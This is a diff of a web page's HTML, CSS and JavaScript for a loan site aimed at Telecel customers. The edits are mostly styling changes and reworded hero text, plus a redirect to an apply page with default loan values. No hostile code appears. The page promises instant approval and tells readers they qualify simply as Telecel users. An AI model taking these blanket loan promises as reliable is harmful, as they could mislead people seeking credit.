@@ -11,7 +11,6 @@
             --red: #E42320;
             --dark: #0a0a0a;
             --gray: #1a1a1a;
-            --light-gray: #222;
             --accent-green: #00A651;
             --blue: #00A3FF;
         }
@@ -58,22 +57,16 @@
 
         /* Hero */
         .hero {
-            background: linear-gradient(rgba(10,10,10,0.78), rgba(10,10,10,0.85)), 
+            background: linear-gradient(rgba(10,10,10,0.82), rgba(10,10,10,0.88)), 
                         url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-4.0.3&auto=format&fit=crop&q=80') center/cover no-repeat;
-            color: white; padding: 180px 5% 140px; text-align: center; position: relative;
+            color: white; padding: 140px 5% 100px; text-align: center;
         }
-        .hero::before {
-            content: '🎉💰'; font-size: 140px; opacity: 0.12; position: absolute; bottom: 40px; right: 60px;
-            animation: float 7s ease-in-out infinite;
-        }
-        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-30px); } }
-
-        .hero h1 { font-size: clamp(2.8rem, 7vw, 4.4rem); font-weight: 800; margin-bottom: 18px; }
-        .hero p { font-size: 1.3rem; max-width: 720px; margin: 0 auto 40px; opacity: 0.95; }
+        .hero h1 { font-size: clamp(2.6rem, 6.5vw, 4rem); font-weight: 800; margin-bottom: 16px; }
+        .hero p { font-size: 1.25rem; max-width: 700px; margin: 0 auto 35px; opacity: 0.95; }
 
         /* Calculator */
         .estimator {
-            max-width: 720px; margin: -90px auto 80px; background: var(--gray);
+            max-width: 720px; margin: -80px auto 80px; background: var(--gray);
             padding: 55px 50px; border-radius: 28px; border: 1px solid #333;
             box-shadow: 0 25px 60px rgba(0,0,0,0.5);
         }
@@ -119,14 +112,6 @@
         }
         .get-loan-btn:hover { background: #c41e1b; transform: scale(1.05); }
 
-        .benefit-card h3 { color: var(--accent-green); margin-bottom: 12px; font-size: 1.5rem; }
-        .testimonial-card p { font-style: italic; margin-bottom: 16px; }
-        .testimonial-card strong { color: var(--blue); }
-
-        .faq-item { background: var(--gray); margin-bottom: 18px; border-radius: 16px; border: 1px solid #333; overflow: hidden; }
-        .faq-question { padding: 22px 28px; cursor: pointer; font-weight: 600; display: flex; justify-content: space-between; align-items: center; }
-        .faq-answer { padding: 0 28px 28px; display: none; color: #ccc; }
-
         footer { background: #111; color: #bbb; padding: 90px 5% 50px; }
         .footer-content { max-width: 1400px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 50px; }
 
@@ -140,13 +125,12 @@
             padding: 40px 32px; text-align: center; border: 3px solid var(--red);
             box-shadow: 0 20px 60px rgba(0,0,0,0.6);
         }
-        .success-icon { font-size: 4.5rem; color: var(--accent-green); margin-bottom: 20px; animation: pop 0.6s; }
-        @keyframes pop { 0% { transform: scale(0.6); } 100% { transform: scale(1); } }
+        .success-icon { font-size: 4.5rem; color: var(--accent-green); margin-bottom: 20px; }
 
         @media (max-width: 768px) {
             .nav-links { display: none; }
             .hamburger { display: block; }
-            .hero { padding: 140px 5% 100px; }
+            .hero { padding: 120px 5% 90px; }
             .estimator { margin: -60px 20px 60px; padding: 40px 25px; }
             .logo svg { width: 140px; height: 140px; }
         }
@@ -160,7 +144,6 @@
             <span>🔥 Instant Approval • Money in Minutes</span>
             <span>✅ No Collateral • Only Active Telecel Line Needed</span>
             <span>📱 Apply in 60 Seconds • Funds to Telecel Cash</span>
-            <span>🔄 Flexible Repayment • Up to 90 Days</span>
         </div>
     </div>
 
@@ -199,11 +182,11 @@
 
     <!-- Hero -->
     <section class="hero" id="home">
-        <h1>Instant Flex Loans with Telecel Cash</h1>
-        <p>Get cash instantly on your active Telecel line. No paperwork. No collateral. Money in your wallet in minutes.</p>
+        <h1>Instant Flex Loans for Telecel Customers</h1>
+        <p>As a loyal Telecel user, you qualify for fast, collateral-free loans. Get money directly into your Telecel Cash wallet in minutes.</p>
         <button onclick="document.getElementById('estimator').scrollIntoView({behavior:'smooth'})"
                 style="background:white; color:#000; padding:18px 48px; font-size:1.3rem; font-weight:700; border:none; border-radius:50px; cursor:pointer;">
-            Check My Limit →
+            Check My Eligibility →
         </button>
     </section>
 
@@ -233,7 +216,7 @@
         <button class="btn-proceed" onclick="showConfirmModal()">Proceed to Apply →</button>
     </div>
 
-    <!-- Other Sections (Loans, Benefits, How it Works, Testimonials, FAQ, Footer) -->
+    <!-- Other Sections -->
     <section id="loans" class="section">
         <h2 class="section-title">Popular Loan Packages</h2>
         <div class="packages-grid">
@@ -394,26 +377,20 @@
             closeModal();
             const amount = document.getElementById('amountSlider').value;
             const duration = document.getElementById('duration').value;
-            
             document.getElementById('successDetails').innerHTML = `Amount: <strong>GHS ${parseInt(amount).toLocaleString()}</strong><br>Duration: <strong>${duration} Days</strong>`;
             document.getElementById('successModal').style.display = 'flex';
         }
 
-        // Updated to redirect to apply.html
         function proceedToApply() {
             closeModal();
-            const amount = document.getElementById('amountSlider').value;
-            const duration = document.getElementById('duration').value;
+            const amount = document.getElementById('amountSlider').value || 5000;
+            const duration = document.getElementById('duration').value || 30;
             window.location.href = `apply.html?amount=${amount}&duration=${duration}&purpose=Personal`;
         }
 
         function quickApply(amount, duration, purpose) {
             document.getElementById('successDetails').innerHTML = `Amount: <strong>GHS ${amount}</strong><br>Purpose: <strong>${purpose}</strong>`;
             document.getElementById('successModal').style.display = 'flex';
-            // Store for later use
-            window.selectedAmount = amount;
-            window.selectedDuration = duration;
-            window.selectedPurpose = purpose;
         }
 
         function showLoginModal() {
